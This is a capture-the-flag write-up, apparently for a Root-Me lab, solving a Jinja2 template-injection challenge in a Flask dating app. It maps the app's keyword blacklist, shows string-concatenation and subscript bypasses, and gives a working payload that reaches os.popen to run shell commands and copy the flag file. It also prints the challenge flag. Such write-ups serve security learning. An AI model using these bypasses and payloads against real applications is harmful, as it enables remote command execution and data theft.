# SSTI - Python - Filter Bypass — notes

Target: https://instance-019fe9d3-100d-72b5-b0ee-ffec6b5fe300.challenges.root-me.pro/
App: "RMeet" dating app, Flask + gunicorn, Jinja2. Flag at `/flag.txt`.

## Recon

- `/` → links `/login`, `/register`. Flask-WTF forms with `csrf_token`.
- Registered `pauk9x` (id 10) → `/start` (profile completion) → `/swipe`.
- Routes found: `/start`, `/swipe`, `/matches`, `/photos`, `/profile/<username>`,
  `/config.js` (rendered JS: `window.myUserId = 10;`), API `/api/swipe` (POST JSON
  `{user_id, direction}`), `/api/user/<id>`.
- `/profile/<other>` → "Accès refusé" unless matched.

## Dead ends (no SSTI)

- Profile fields (`full_name`, `age`, `gender`, `location`, `bio`, `interests`) —
  reflected on own profile view and on a *matched* user's profile view, but escaped,
  never evaluated.
- Username in URL / username of logged-in user — not evaluated.
- 404 handler — plain Werkzeug page.
- Registered accounts with `{{7*7}}` usernames: stored, never rendered as template.

## Finding the sink

`/matches` (only visible after a real match) links to **`/messages/<username>`** — a chat
form with **no CSRF token**. Messages are rendered through Jinja **at send time** and the
*rendered output* is stored.

Getting a match: second account `bobtester` (id 14) likes `pauk9x` (id 10) via
`POST /api/swipe`, then `pauk9x` likes back → `match_created: true`.

Proof of SSTI: `{% if 1 %}x{% endif %}` → stored as `x`; `{#comment#}` stripped.

## Filter map (message rejected silently = blocked)

Blacklisted substrings:
`{{`  `}}`  `__`  `self`  `class`  `import`  `system`  `popen`  `globals`  `builtins`
`mro`  `flag`  `cycler`  `chr`  `getcwd`  `+`  `()`

Allowed / useful:
- `{% ... %}` statement blocks (execute fine — just no expression output)
- `~` (Jinja string concat) → defeats the whole keyword blacklist
- `|attr(...)` and `[...]` subscript (Jinja getitem falls back to getattr)
- `'_'*2` → builds `__` without the literal
- globals present: `lipsum`, `url_for`, `request`, `session`, `g`, `config`, `dict`, `range`
- `{% include 'name' %}` works (verified with `{% include 'base.html' %}`)

**Hard limit: messages longer than 150 chars are dropped.** This masked several early
tests — they looked "filtered" but were just too long. Anything that raises during
render is also dropped (`{% set x = 1/0 %}` → gone) — useful as a boolean/error oracle.

## Gadget chain (verified step by step)

```
lipsum['_'*2~'glob'~'als'~'_'*2]                 -> jinja2.utils module globals
  ['os']                                          -> os module (jinja2.utils imports os)
  ['po'~'pen']('cmd')['read'](9)                  -> RCE  (read(9) because () is blocked)
url_for['_'*2~'glob'~'als'~'_'*2]['current_app']['jinja_env']   -> also reachable
```

## Output channel

No `{{ }}` → no way to print an expression. Instead: RCE writes the flag into the
Jinja template search dir, then a second message `{% include %}`s it. cwd had no
`templates/`, so the shell locates it: `dirname $(find / -name base.html | head -1)`.

Exploit (141 chars):

```
{% set y=lipsum['_'*2~'glob'~'als'~'_'*2]['os']['po'~'pen']('cp /fl'~'ag.txt $(dirname $(find / -name base.html|head -1))/x')['read'](9) %}GO
```

then:

```
{% include 'x' %}
```

→ `RM{f4fb91eb42125d167437a61f6a3c1e7e}`

## Flag

`RM{f4fb91eb42125d167437a61f6a3c1e7e}`
